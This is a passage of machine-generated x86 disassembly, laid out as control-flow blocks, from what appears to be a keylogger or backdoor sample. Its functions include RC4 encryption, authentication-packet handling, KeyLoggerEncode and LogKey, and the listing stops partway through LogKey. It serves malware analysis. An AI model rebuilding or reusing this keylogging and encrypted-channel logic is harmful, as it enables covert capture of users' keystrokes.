v
0x80547e0:	je	0x8054855
None
|
|
|
v
0x8054839:	add	esp, 0xc
0x805483c:	mov	edx, dword ptr [esp]
0x805483f:	mov	al, byte ptr [esp + esi + 8]
0x8054843:	dec	edx
0x8054844:	xor	al, byte ptr [ebp]
0x8054847:	inc	ebp
0x8054848:	mov	byte ptr [esp + esi + 8], al
0x805484c:	inc	esi
0x805484d:	mov	byte ptr [ebx], al
0x805484f:	and	esi, 0xf
0x8054852:	inc	ebx
0x8054853:	jmp	0x8054859
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:AESFreeContext
TOTAL BLOCKS :4
0x8054875:	sub	esp, 0xc
0x8054878:	push	eax
0x8054879:	call	0x804bbc0
None
|
|
|
v
0x8054867:	push	ebx
0x8054868:	sub	esp, 8
0x805486b:	mov	ebx, dword ptr [esp + 0x10]
0x805486f:	mov	eax, dword ptr [ebx]
0x8054871:	test	eax, eax
0x8054873:	je	0x8054881
None
|
|
|
v
0x8054881:	mov	dword ptr [ebx], 0
0x8054887:	add	esp, 8
0x805488a:	pop	ebx
0x805488b:	ret	
None
|
|
|
v
0x805487e:	add	esp, 0x10
0x8054881:	mov	dword ptr [ebx], 0
0x8054887:	add	esp, 8
0x805488a:	pop	ebx
0x805488b:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:RC4Setup
TOTAL BLOCKS :5
0x8054900:	pop	eax
0x8054901:	pop	ebx
0x8054902:	pop	esi
0x8054903:	pop	edi
0x8054904:	pop	ebp
0x8054905:	ret	
None
|
|
|
v
0x80548a8:	mov	byte ptr [eax + edx + 8], dl
0x80548ac:	inc	edx
0x80548ad:	cmp	edx, 0x100
0x80548b3:	jne	0x80548a8
None
|
|
|
v
0x80548bf:	mov	edx, dword ptr [esp + 0x20]
0x80548c3:	cmp	dword ptr [esp], edx
0x80548c6:	setl	dl
0x80548c9:	movzx	edx, dl
0x80548cc:	mov	esi, edx
0x80548ce:	neg	esi
0x80548d0:	and	dword ptr [esp], esi
0x80548d3:	mov	edx, dword ptr [esp]
0x80548d6:	movzx	esi, byte ptr [eax + ecx + 8]
0x80548db:	inc	dword ptr [esp]
0x80548de:	mov	dl, byte ptr [edi + edx]
0x80548e1:	lea	ebp, dword ptr [esi + edx]
0x80548e4:	add	ebx, ebp
0x80548e6:	movzx	ebx, bl
0x80548e9:	mov	dl, byte ptr [eax + ebx + 8]
0x80548ed:	mov	byte ptr [eax + ecx + 8], dl
0x80548f1:	inc	ecx
0x80548f2:	mov	edx, esi
0x80548f4:	cmp	ecx, 0x100
0x80548fa:	mov	byte ptr [eax + ebx + 8], dl
0x80548fe:	jne	0x80548bf
None
|
|
|
v
0x805488c:	push	ebp
0x805488d:	push	edi
0x805488e:	push	esi
0x805488f:	push	ebx
0x8054890:	push	edx
0x8054891:	mov	eax, dword ptr [esp + 0x18]
0x8054895:	xor	edx, edx
0x8054897:	mov	edi, dword ptr [esp + 0x1c]
0x805489b:	mov	dword ptr [eax], 0
0x80548a1:	mov	dword ptr [eax + 4], 0
0x80548a8:	mov	byte ptr [eax + edx + 8], dl
0x80548ac:	inc	edx
0x80548ad:	cmp	edx, 0x100
0x80548b3:	jne	0x80548a8
None
|
|
|
v
0x80548b5:	xor	dx, dx
0x80548b8:	xor	ebx, ebx
0x80548ba:	xor	ecx, ecx
0x80548bc:	mov	dword ptr [esp], edx
0x80548bf:	mov	edx, dword ptr [esp + 0x20]
0x80548c3:	cmp	dword ptr [esp], edx
0x80548c6:	setl	dl
0x80548c9:	movzx	edx, dl
0x80548cc:	mov	esi, edx
0x80548ce:	neg	esi
0x80548d0:	and	dword ptr [esp], esi
0x80548d3:	mov	edx, dword ptr [esp]
0x80548d6:	movzx	esi, byte ptr [eax + ecx + 8]
0x80548db:	inc	dword ptr [esp]
0x80548de:	mov	dl, byte ptr [edi + edx]
0x80548e1:	lea	ebp, dword ptr [esi + edx]
0x80548e4:	add	ebx, ebp
0x80548e6:	movzx	ebx, bl
0x80548e9:	mov	dl, byte ptr [eax + ebx + 8]
0x80548ed:	mov	byte ptr [eax + ecx + 8], dl
0x80548f1:	inc	ecx
0x80548f2:	mov	edx, esi
0x80548f4:	cmp	ecx, 0x100
0x80548fa:	mov	byte ptr [eax + ebx + 8], dl
0x80548fe:	jne	0x80548bf
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:RC4Crypt
TOTAL BLOCKS :6
0x8054906:	push	ebp
0x8054907:	push	edi
0x8054908:	push	esi
0x8054909:	push	ebx
0x805490a:	sub	esp, 0x104
0x8054910:	mov	ebx, dword ptr [esp + 0x118]
0x8054917:	mov	esi, dword ptr [esp + 0x11c]
0x805491e:	mov	eax, dword ptr [ebx]
0x8054920:	mov	ecx, dword ptr [ebx + 4]
0x8054923:	mov	dword ptr [esp], eax
0x8054926:	xor	eax, eax
0x8054928:	mov	dl, byte ptr [ebx + eax + 8]
0x805492c:	mov	byte ptr [esp + eax + 4], dl
0x8054930:	inc	eax
0x8054931:	cmp	eax, 0x100
0x8054936:	jne	0x8054928
None
|
|
|
v
0x805493d:	mov	edx, dword ptr [esp]
0x8054940:	inc	edx
0x8054941:	and	edx, 0xff
0x8054947:	mov	bl, byte ptr [esp + edx + 4]
0x805494b:	mov	dword ptr [esp], edx
0x805494e:	mov	edi, dword ptr [esp]
0x8054951:	add	ecx, ebx
0x8054953:	movzx	ecx, cl
0x8054956:	movzx	ebp, byte ptr [esp + ecx + 4]
0x805495b:	mov	edx, ebp
0x805495d:	mov	byte ptr [esp + edi + 4], dl
0x8054961:	mov	byte ptr [esp + ecx + 4], bl
0x8054965:	add	ebx, ebp
0x8054967:	movzx	ebx, bl
0x805496a:	mov	bl, byte ptr [esp + ebx + 4]
0x805496e:	xor	byte ptr [esi + eax], bl
0x8054971:	inc	eax
0x8054972:	cmp	eax, dword ptr [esp + 0x120]
0x8054979:	jl	0x805493d
None
|
|
|
v
0x8054938:	xor	ax, ax
0x805493b:	jmp	0x8054972
None
|
|
|
v
0x805497b:	add	esp, 0x104
0x8054981:	pop	ebx
0x8054982:	pop	esi
0x8054983:	pop	edi
0x8054984:	pop	ebp
0x8054985:	ret	
None
|
|
|
v
0x8054972:	cmp	eax, dword ptr [esp + 0x120]
0x8054979:	jl	0x805493d
None
|
|
|
v
0x8054928:	mov	dl, byte ptr [ebx + eax + 8]
0x805492c:	mov	byte ptr [esp + eax + 4], dl
0x8054930:	inc	eax
0x8054931:	cmp	eax, 0x100
0x8054936:	jne	0x8054928
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:RotateLeft
TOTAL BLOCKS :1
0x8054988:	push	ebx
0x8054989:	mov	dl, byte ptr [esp + 0xc]
0x805498d:	mov	ecx, 8
0x8054992:	movzx	ebx, byte ptr [esp + 8]
0x8054997:	movzx	eax, dl
0x805499a:	sub	ecx, eax
0x805499c:	mov	eax, ebx
0x805499e:	sar	eax, cl
0x80549a0:	mov	cl, dl
0x80549a2:	shl	ebx, cl
0x80549a4:	or	eax, ebx
0x80549a6:	pop	ebx
0x80549a7:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:GenerateRandomData
TOTAL BLOCKS :7
0x80549d5:	push	eax
0x80549d6:	push	eax
0x80549d7:	push	0xff
0x80549dc:	push	1
0x80549de:	call	0x8054c5c
None
|
|
|
v
0x80549d0:	add	esp, 0x10
0x80549d3:	jmp	0x80549ea
None
|
|
|
v
0x80549ea:	cmp	ebx, esi
0x80549ec:	jl	0x80549d5
None
|
|
|
v
0x80549ee:	add	esp, 0x10
0x80549f1:	pop	ebx
0x80549f2:	pop	esi
0x80549f3:	pop	edi
0x80549f4:	ret	
None
|
|
|
v
0x80549e3:	add	esp, 0x10
0x80549e6:	mov	byte ptr [edi + ebx], al
0x80549e9:	inc	ebx
0x80549ea:	cmp	ebx, esi
0x80549ec:	jl	0x80549d5
None
|
|
|
v
0x80549c2:	mov	eax, dword ptr [esp + 0x1c]
0x80549c6:	xor	eax, esi
0x80549c8:	mov	dword ptr [esp], eax
0x80549cb:	call	0x8054c00
None
|
|
|
v
0x80549a8:	push	edi
0x80549a9:	push	esi
0x80549aa:	push	ebx
0x80549ab:	xor	ebx, ebx
0x80549ad:	sub	esp, 0x1c
0x80549b0:	lea	eax, dword ptr [esp + 0x18]
0x80549b4:	mov	esi, dword ptr [esp + 0x30]
0x80549b8:	mov	edi, dword ptr [esp + 0x2c]
0x80549bc:	push	eax
0x80549bd:	call	0x804bbf0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:Calculate
TOTAL BLOCKS :11
0x8054a30:	movzx	edi, al
0x8054a33:	mov	edx, edi
0x8054a35:	sar	edx, 5
0x8054a38:	shl	edi, 3
0x8054a3b:	or	edx, edi
0x8054a3d:	and	edx, eax
0x8054a3f:	mov	byte ptr [esp + eax], dl
0x8054a42:	inc	eax
0x8054a43:	cmp	eax, 0x1f
0x8054a46:	jle	0x8054a30
None
|
|
|
v
0x8054a14:	movzx	edi, byte ptr [ebx + eax]
0x8054a18:	mov	ebp, edi
0x8054a1a:	sar	ebp, 4
0x8054a1d:	shl	edi, 4
0x8054a20:	or	edi, ebp
0x8054a22:	mov	edx, edi
0x8054a24:	mov	byte ptr [esp + eax], dl
0x8054a27:	inc	eax
0x8054a28:	cmp	eax, ecx
0x8054a2a:	jl	0x8054a14
None
|
|
|
v
0x8054a0b:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8054a54:	mov	bl, byte ptr [esi + eax]
0x8054a57:	xor	dl, byte ptr [esp + eax]
0x8054a5a:	mov	edi, edx
0x8054a5c:	xor	edi, ebx
0x8054a5e:	mov	ebx, dword ptr [esp + 0x3c]
0x8054a62:	mov	edx, edi
0x8054a64:	mov	byte ptr [ebx + eax], dl
0x8054a67:	mov	ebx, edi
0x8054a69:	movzx	ebp, bl
0x8054a6c:	lea	edx, dword ptr [edi*4]
0x8054a73:	lea	edi, dword ptr [ebp*8]
0x8054a7a:	sar	ebp, 5
0x8054a7d:	or	edi, ebp
0x8054a7f:	lea	ebp, dword ptr [eax + ecx]
0x8054a82:	xor	ebp, eax
0x8054a84:	or	edi, ebp
0x8054a86:	mov	ebp, dword ptr [esp + 0x3c]
0x8054a8a:	xor	dl, byte ptr [esi + eax]
0x8054a8d:	mov	ebx, edi
0x8054a8f:	mov	byte ptr [ebp + eax], bl
0x8054a93:	inc	eax
0x8054a94:	not	edx
0x8054a96:	cmp	eax, 0x20
0x8054a99:	jne	0x8054a54
None
|
|
|
v
0x8054a0d:	xor	eax, eax
0x8054a0f:	not	ecx
0x8054a11:	dec	ecx
0x8054a12:	jmp	0x8054a28
None
|
|
|
v
0x8054a48:	mov	eax, ecx
0x8054a4a:	sar	eax, 2
0x8054a4d:	mov	dl, byte ptr [esp + eax]
0x8054a50:	xor	eax, eax
0x8054a52:	xor	edx, ecx
0x8054a54:	mov	bl, byte ptr [esi + eax]
0x8054a57:	xor	dl, byte ptr [esp + eax]
0x8054a5a:	mov	edi, edx
0x8054a5c:	xor	edi, ebx
0x8054a5e:	mov	ebx, dword ptr [esp + 0x3c]
0x8054a62:	mov	edx, edi
0x8054a64:	mov	byte ptr [ebx + eax], dl
0x8054a67:	mov	ebx, edi
0x8054a69:	movzx	ebp, bl
0x8054a6c:	lea	edx, dword ptr [edi*4]
0x8054a73:	lea	edi, dword ptr [ebp*8]
0x8054a7a:	sar	ebp, 5
0x8054a7d:	or	edi, ebp
0x8054a7f:	lea	ebp, dword ptr [eax + ecx]
0x8054a82:	xor	ebp, eax
0x8054a84:	or	edi, ebp
0x8054a86:	mov	ebp, dword ptr [esp + 0x3c]
0x8054a8a:	xor	dl, byte ptr [esi + eax]
0x8054a8d:	mov	ebx, edi
0x8054a8f:	mov	byte ptr [ebp + eax], bl
0x8054a93:	inc	eax
0x8054a94:	not	edx
0x8054a96:	cmp	eax, 0x20
0x8054a99:	jne	0x8054a54
None
|
|
|
v
0x8054a2c:	mov	eax, ecx
0x8054a2e:	jmp	0x8054a43
None
|
|
|
v
0x8054a9b:	add	esp, 0x20
0x8054a9e:	pop	ebx
0x8054a9f:	pop	esi
0x8054aa0:	pop	edi
0x8054aa1:	pop	ebp
0x8054aa2:	ret	
None
|
|
|
v
0x8054a43:	cmp	eax, 0x1f
0x8054a46:	jle	0x8054a30
None
|
|
|
v
0x80549f5:	push	ebp
0x80549f6:	xor	eax, eax
0x80549f8:	push	edi
0x80549f9:	or	ecx, 0xffffffff
0x80549fc:	push	esi
0x80549fd:	push	ebx
0x80549fe:	sub	esp, 0x20
0x8054a01:	mov	ebx, dword ptr [esp + 0x34]
0x8054a05:	mov	esi, dword ptr [esp + 0x38]
0x8054a09:	mov	edi, ebx
0x8054a0b:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x8054a28:	cmp	eax, ecx
0x8054a2a:	jl	0x8054a14
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:SendAuthenticationPacket
TOTAL BLOCKS :16
0x8054b43:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x8054b26:	add	esp, 0x10
0x8054b29:	xor	eax, eax
0x8054b2b:	jmp	0x8054b57
None
|
|
|
v
0x8054af7:	push	edx
0x8054af8:	push	edx
0x8054af9:	lea	edx, dword ptr [esp + 0x38]
0x8054afd:	lea	ebx, dword ptr [esp + 8]
0x8054b01:	push	edx
0x8054b02:	push	0x8058714
0x8054b07:	push	0x805c290
0x8054b0c:	push	0x10
0x8054b0e:	push	1
0x8054b10:	push	eax
0x8054b11:	call	0x80547a2
None
|
|
|
v
0x8054ace:	add	esp, 0xc
0x8054ad1:	lea	ebx, dword ptr [esp + 0x64]
0x8054ad5:	push	ebx
0x8054ad6:	push	esi
0x8054ad7:	push	0x80584ec
0x8054adc:	call	0x80549f5
None
|
|
|
v
0x8054ac0:	pop	ecx
0x8054ac1:	pop	ebx
0x8054ac2:	push	0x10
0x8054ac4:	push	0x805c290
0x8054ac9:	call	0x80549a8
None
|
|
|
v
0x8054aa3:	push	ebp
0x8054aa4:	push	edi
0x8054aa5:	push	esi
0x8054aa6:	push	ebx
0x8054aa7:	sub	esp, 0x94
0x8054aad:	mov	ebp, dword ptr [esp + 0xa8]
0x8054ab4:	push	0x20
0x8054ab6:	lea	esi, dword ptr [esp + 0x4c]
0x8054aba:	push	esi
0x8054abb:	call	0x80549a8
None
|
|
|
v
0x8054b34:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x8054b45:	push	0x40
0x8054b47:	push	ebx
0x8054b48:	push	3
0x8054b4a:	push	dword ptr [ebp]
0x8054b4d:	call	0x804e62a
None
|
|
|
v
0x8054b52:	add	esp, 0x10
0x8054b55:	mov	al, 1
0x8054b57:	add	esp, 0x8c
0x8054b5d:	pop	ebx
0x8054b5e:	pop	esi
0x8054b5f:	pop	edi
0x8054b60:	pop	ebp
0x8054b61:	ret	
None
|
|
|
v
0x8054b16:	add	esp, 0x20
0x8054b19:	test	al, al
0x8054b1b:	jne	0x8054b2d
None
|
|
|
v
0x8054b1d:	sub	esp, 0xc
0x8054b20:	push	ebp
0x8054b21:	call	0x804e827
None
|
|
|
v
0x8054ae1:	pop	edi
0x8054ae2:	pop	eax
0x8054ae3:	push	0x20
0x8054ae5:	push	ebx
0x8054ae6:	call	0x805460a
None
|
|
|
v
0x8054b2d:	mov	ecx, 8
0x8054b32:	mov	edi, ebx
0x8054b34:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x8054b57:	add	esp, 0x8c
0x8054b5d:	pop	ebx
0x8054b5e:	pop	esi
0x8054b5f:	pop	edi
0x8054b60:	pop	ebp
0x8054b61:	ret	
None
|
|
|
v
0x8054aeb:	add	esp, 0x10
0x8054aee:	test	eax, eax
0x8054af0:	mov	dword ptr [0x805c28c], eax
0x8054af5:	je	0x8054b1d
None
|
|
|
v
0x8054b36:	lea	eax, dword ptr [esp + 0x20]
0x8054b3a:	mov	esi, 0x805c290
0x8054b3f:	mov	edi, eax
0x8054b41:	mov	cl, 4
0x8054b43:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:ParseAuthenticationPacket
TOTAL BLOCKS :13
0x8054ba2:	push	edx
0x8054ba3:	push	edx
0x8054ba4:	push	ebx
0x8054ba5:	push	ebx
0x8054ba6:	push	0x805c290
0x8054bab:	push	0x10
0x8054bad:	push	2
0x8054baf:	push	eax
0x8054bb0:	call	0x80547a2
None
|
|
|
v
0x8054b7c:	sub	esp, 0xc
0x8054b7f:	push	0x20
0x8054b81:	push	esi
0x8054b82:	call	0x805460a
None
|
|
|
v
0x8054be8:	mov	dword ptr [esp], 0x805c2a0
0x8054bef:	call	0x8054867
None
|
|
|
v
0x8054b87:	add	esp, 0x20
0x8054b8a:	test	eax, eax
0x8054b8c:	mov	dword ptr [0x805c2a0], eax
0x8054b91:	jne	0x8054ba2
None
|
|
|
v
0x8054bc5:	add	esp, 0x10
0x8054bc8:	test	eax, eax
0x8054bca:	jne	0x8054bd9
None
|
|
|
v
0x8054bf9:	add	esp, 0x24
0x8054bfc:	pop	ebx
0x8054bfd:	pop	esi
0x8054bfe:	ret	
None
|
|
|
v
0x8054bf4:	add	esp, 0x10
0x8054bf7:	xor	eax, eax
0x8054bf9:	add	esp, 0x24
0x8054bfc:	pop	ebx
0x8054bfd:	pop	esi
0x8054bfe:	ret	
None
|
|
|
v
0x8054bd9:	push	0
0x8054bdb:	push	0
0x8054bdd:	push	4
0x8054bdf:	push	dword ptr [esp + 0x3c]
0x8054be3:	call	0x804e62a
None
|
|
|
v
0x8054bcc:	mov	eax, dword ptr [esp + 0x30]
0x8054bd0:	mov	dword ptr [0x8058724], eax
0x8054bd5:	mov	al, 1
0x8054bd7:	jmp	0x8054bf9
None
|
|
|
v
0x8054bb5:	add	esp, 0x1c
0x8054bb8:	push	0x10
0x8054bba:	push	0x8058714
0x8054bbf:	push	ebx
0x8054bc0:	call	0x8052233
None
|
|
|
v
0x8054b93:	sub	esp, 0xc
0x8054b96:	lea	eax, dword ptr [esp + 0x3c]
0x8054b9a:	push	eax
0x8054b9b:	call	0x804e827
None
|
|
|
v
0x8054ba0:	jmp	0x8054bf4
None
|
|
|
v
0x8054b62:	push	esi
0x8054b63:	push	ebx
0x8054b64:	sub	esp, 0x24
0x8054b67:	mov	esi, esp
0x8054b69:	mov	ebx, dword ptr [esp + 0x38]
0x8054b6d:	push	esi
0x8054b6e:	push	dword ptr [esp + 0x38]
0x8054b72:	push	0x80584ec
0x8054b77:	call	0x80549f5
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:SeedRandom
TOTAL BLOCKS :1
0x8054c00:	mov	ecx, dword ptr [esp + 4]
0x8054c04:	mov	edx, dword ptr [0x805872c]
0x8054c0a:	mov	eax, ecx
0x8054c0c:	and	eax, edx
0x8054c0e:	xor	eax, dword ptr [0x8058728]
0x8054c14:	mov	dword ptr [0x8058728], eax
0x8054c19:	or	eax, ecx
0x8054c1b:	xor	eax, edx
0x8054c1d:	mov	dword ptr [0x805872c], eax
0x8054c22:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:GetRandom
TOTAL BLOCKS :1
0x8054c23:	mov	ecx, dword ptr [0x805872c]
0x8054c29:	movzx	edx, cx
0x8054c2c:	imul	edx, edx, 0x9069
0x8054c32:	shl	ecx, 0x10
0x8054c35:	add	edx, ecx
0x8054c37:	mov	ecx, dword ptr [0x8058728]
0x8054c3d:	mov	dword ptr [0x805872c], edx
0x8054c43:	shl	edx, 0xc
0x8054c46:	movzx	eax, cx
0x8054c49:	imul	eax, eax, 0x4650
0x8054c4f:	shl	ecx, 0x10
0x8054c52:	add	eax, ecx
0x8054c54:	mov	dword ptr [0x8058728], eax
0x8054c59:	add	eax, edx
0x8054c5b:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:RandomRange
TOTAL BLOCKS :2
0x8054c5c:	push	ebx
0x8054c5d:	mov	ebx, dword ptr [esp + 8]
0x8054c61:	call	0x8054c23
None
|
|
|
v
0x8054c66:	mov	ecx, dword ptr [esp + 0xc]
0x8054c6a:	xor	edx, edx
0x8054c6c:	sub	ecx, ebx
0x8054c6e:	inc	ecx
0x8054c6f:	div	ecx
0x8054c71:	lea	eax, dword ptr [edx + ebx]
0x8054c74:	pop	ebx
0x8054c75:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:KeyLoggerEncode
TOTAL BLOCKS :4
0x8054c85:	mov	dl, byte ptr [ecx + eax]
0x8054c88:	xor	edx, 0xffffff9d
0x8054c8b:	add	edx, 0x24
0x8054c8e:	mov	byte ptr [ecx + eax], dl
0x8054c91:	inc	eax
0x8054c92:	cmp	eax, ebx
0x8054c94:	jne	0x8054c85
None
|
|
|
v
0x8054c96:	pop	ebx
0x8054c97:	ret	
None
|
|
|
v
0x8054c78:	push	ebx
0x8054c79:	xor	eax, eax
0x8054c7b:	mov	ecx, dword ptr [esp + 8]
0x8054c7f:	mov	ebx, dword ptr [esp + 0xc]
0x8054c83:	jmp	0x8054c92
None
|
|
|
v
0x8054c92:	cmp	eax, ebx
0x8054c94:	jne	0x8054c85
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_8054c98
TOTAL BLOCKS :16
0x8054cc9:	sub	esp, 0xc
0x8054ccc:	push	0x8058374
0x8054cd1:	call	0x804f0fc
None
|
|
|
v
0x8054d4e:	add	esp, 0x10
0x8054d51:	pop	edx
0x8054d52:	pop	ebx
0x8054d53:	pop	esi
0x8054d54:	ret	
None
|
|
|
v
0x8054cbd:	sub	esp, 0xc
0x8054cc0:	push	eax
0x8054cc1:	call	0x804bfb0
None
|
|
|
v
0x8054d21:	mov	dword ptr [0x8058730], 1
0x8054d2b:	xor	eax, eax
0x8054d2d:	jmp	0x8054d51
None
|
|
|
v
0x8054cc6:	add	esp, 0x10
0x8054cc9:	sub	esp, 0xc
0x8054ccc:	push	0x8058374
0x8054cd1:	call	0x804f0fc
None
|
|
|
v
0x8054d35:	push	ecx
0x8054d36:	push	ecx
0x8054d37:	push	esi
0x8054d38:	push	ebx
0x8054d39:	call	0x8054c78
None
|
|
|
v
0x8054d2f:	xor	eax, eax
0x8054d31:	test	esi, esi
0x8054d33:	jle	0x8054d51
None
|
|
|
v
0x8054d3e:	add	esp, 0xc
0x8054d41:	push	esi
0x8054d42:	push	ebx
0x8054d43:	push	dword ptr [0x8058738]
0x8054d49:	call	0x804bdd0
None
|
|
|
v
0x8054c98:	push	esi
0x8054c99:	mov	esi, edx
0x8054c9b:	push	ebx
0x8054c9c:	push	ebx
0x8054c9d:	mov	ebx, eax
0x8054c9f:	or	eax, 0xffffffff
0x8054ca2:	cmp	dword ptr [0x8058730], 0
0x8054ca9:	jne	0x8054d51
None
|
|
|
v
0x8054caf:	test	cl, cl
0x8054cb1:	je	0x8054ced
None
|
|
|
v
0x8054ced:	cmp	dword ptr [0x8058738], -1
0x8054cf4:	jne	0x8054d2f
None
|
|
|
v
0x8054cb3:	mov	eax, dword ptr [0x8058738]
0x8054cb8:	cmp	eax, 0xff
0x8054cbb:	je	0x8054cc9
None
|
|
|
v
0x8054d15:	add	esp, 0x10
0x8054d18:	test	eax, eax
0x8054d1a:	mov	dword ptr [0x8058738], eax
0x8054d1f:	jns	0x8054d2f
None
|
|
|
v
0x8054cf6:	push	eax
0x8054cf7:	push	0x1ff
0x8054cfc:	push	0x441
0x8054d01:	push	0x8058374
0x8054d06:	mov	dword ptr [0x8058734], 0xffffffff
0x8054d10:	call	0x804bde0
None
|
|
|
v
0x8054cd6:	add	esp, 0x10
0x8054cd9:	mov	dword ptr [0x8058738], 0xffffffff
0x8054ce3:	mov	dword ptr [0x8058734], 0xffffffff
0x8054ced:	cmp	dword ptr [0x8058738], -1
0x8054cf4:	jne	0x8054d2f
None
|
|
|
v
0x8054d51:	pop	edx
0x8054d52:	pop	ebx
0x8054d53:	pop	esi
0x8054d54:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:LogKey
TOTAL BLOCKS :105
0x805512e:	mov	ebx, dword ptr [esp + 0x140]
0x8055135:	test	ebx, ebx
0x8055137:	jne	0x805514b
None
|
|
|
v
0x8054eb0:	jmp	0x805501f
None
|
|
|
v
0x8054ffd:	push	ebx
0x8054ffe:	push	0x80566e5
0x8055003:	jmp	0x8055055
None
|
|
|
v
0x8054e43:	lea	eax, dword ptr [esp + 0x100]
0x8054e4a:	ja	0x8055005
None
|
|
|
v
0x8054f3b:	lea	eax, dword ptr [esp + 0x120]
0x8054f42:	push	eax
0x8054f43:	push	0x80560f8
0x8054f48:	jmp	0x8055055
None
|
|
|
v
0x8054def:	cmp	eax, 0xff14
0x8054df4:	je	0x805502f
None
|
|
|
v
0x8054dc4:	ja	0x8054e0a
None
|
|
|
v
0x8054ed8:	cmp	eax, 0xffe5
0x8054edd:	jne	0x80551d9
None
|
|
|
v
0x80550bd:	push	edx
0x80550be:	mov	ebx, 0x80564c3
0x80550c3:	push	edx
0x80550c4:	lea	edx, dword ptr [esp + 0x16c]
0x80550cb:	push	edx
0x80550cc:	lea	edx, dword ptr [esp + 0x168]
0x80550d3:	push	edx
0x80550d4:	lea	edx, dword ptr [esp + 0x164]
0x80550db:	push	edx
0x80550dc:	lea	edx, dword ptr [esp + 0x16c]
0x80550e3:	push	edx
0x80550e4:	push	eax
0x80550e5:	push	edi
0x80550e6:	call	dword ptr [0x805be48]
None
|
|
|
v
0x8054e7f:	cmp	eax, 0xff61
0x8054e84:	jne	0x80551d9
None
|
|
|
v
0x8054ef0:	cmp	eax, 0xffea
0x8054ef5:	jbe	0x805504f
None
|
|
|
v
0x8054f79:	push	ecx
0x8054f7a:	push	0x8056682
0x8054f7f:	jmp	0x8055055
None
|
|
|
v
0x805501f:	push	eax
0x8055020:	push	0x8056709
0x8055025:	jmp	0x8055055
None
|
|
|
v
0x8054e05:	jmp	0x8054fed
None
|
|
|
v
0x8054f97:	push	eax
0x8054f98:	push	0x80566a9
0x8054f9d:	jmp	0x8055055
None
|
|
|
v
0x8054ec2:	cmp	eax, 0xffbe
0x8054ec7:	jb	0x80551d9
None
|
|
|
v
0x8055146:	mov	ebx, 0x80564c3
0x805514b:	mov	eax, dword ptr [esp + 0x160]
0x8055152:	cmp	dword ptr [0x8058734], eax
0x8055158:	je	0x80551bb
None
|
|
|
v
0x8054f6e:	push	ebx
0x8054f6f:	push	0x8056677
0x8054f74:	jmp	0x8055055
None
|
|
|
v
0x805509f:	add	esp, 0x10
0x80550a2:	test	eax, eax
0x80550a4:	je	0x805513b
None
|
|
|
v
0x805510b:	push	eax
0x805510c:	mov	ebx, 0x80564c3
0x8055111:	lea	eax, dword ptr [esp + 0x144]
0x8055118:	push	eax
0x8055119:	push	dword ptr [esp + 0x15c]
0x8055120:	push	edi
0x8055121:	call	dword ptr [0x805be28]
None
|
|
|
v
0x8054d55:	push	edi
0x8054d56:	push	esi
0x8054d57:	push	ebx
0x8054d58:	sub	esp, 0x17c
0x8054d5e:	mov	ebx, dword ptr [esp + 0x18c]
0x8054d65:	mov	edi, dword ptr [esp + 0x190]
0x8054d6c:	mov	dword ptr [esp + 0x15c], 0
0x8054d77:	push	0
0x8054d79:	lea	eax, dword ptr [esp + 0x160]
0x8054d80:	push	eax
0x8054d81:	push	0x20
0x8054d83:	lea	eax, dword ptr [esp + 0x138]
0x8054d8a:	push	eax
0x8054d8b:	push	ebx
0x8054d8c:	call	dword ptr [0x805be20]
None
|
|
|
v
0x80551bb:	xor	ecx, ecx
0x80551bd:	mov	edx, esi
0x80551bf:	lea	eax, dword ptr [esp + 0x100]
0x80551c6:	call	0x8054c98
None
|
|
|
v
0x8054e22:	ja	0x8054f6e
None
|
|
|
v
0x805514b:	mov	eax, dword ptr [esp + 0x160]
0x8055152:	cmp	dword ptr [0x8058734], eax
0x8055158:	je	0x80551bb
None
|
|
|
v
0x8054f06:	jmp	0x8054f97
None
|
|
|
v
0x8055047:	push	esi
0x8055048:	push	0x8056736
0x805504d:	jmp	0x8055055
None
|
|
|
v
0x8055069:	test	esi, esi
0x805506b:	jle	0x80551d9
None
|
|
|
v
0x8054f19:	push	edx
0x8054f1a:	push	edx
0x8054f1b:	push	eax
0x8054f1c:	push	0x805663d
0x8054f21:	jmp	0x8054fb1
None
|
|
|
v
0x8054e67:	cmp	eax, 0xff63
0x8054e6c:	je	0x8055027
None
|
|
|
v
0x8054e15:	ja	0x8054e38
None
|
|
|
v
0x8054ff5:	push	esi
0x8054ff6:	push	0x80566de
0x8054ffb:	jmp	0x8055055
None
|
|
|
v
0x8054e33:	jmp	0x8054ff5
None
|
|
|
v
0x8055064:	add	esp, 0x10
0x8055067:	mov	esi, eax
0x8055069:	test	esi, esi
0x805506b:	jle	0x80551d9
None
|
|
|
v
0x8055055:	push	0x20
0x8055057:	lea	eax, dword ptr [esp + 0x10c]
0x805505e:	push	eax
0x805505f:	call	0x804be40
None
|
|
|
v
0x8054e72:	ja	0x8054e8f
None
|
|
|
v
0x8054d99:	mov	byte ptr [esp + eax + 0x120], 0
0x8054da1:	mov	eax, dword ptr [esp + 0x150]
0x8054da8:	cmp	eax, 0xff57
0x8054dad:	je	0x805500f
None
|
|
|
v
0x80550fe:	sub	esp, 0xc
0x8055101:	push	eax
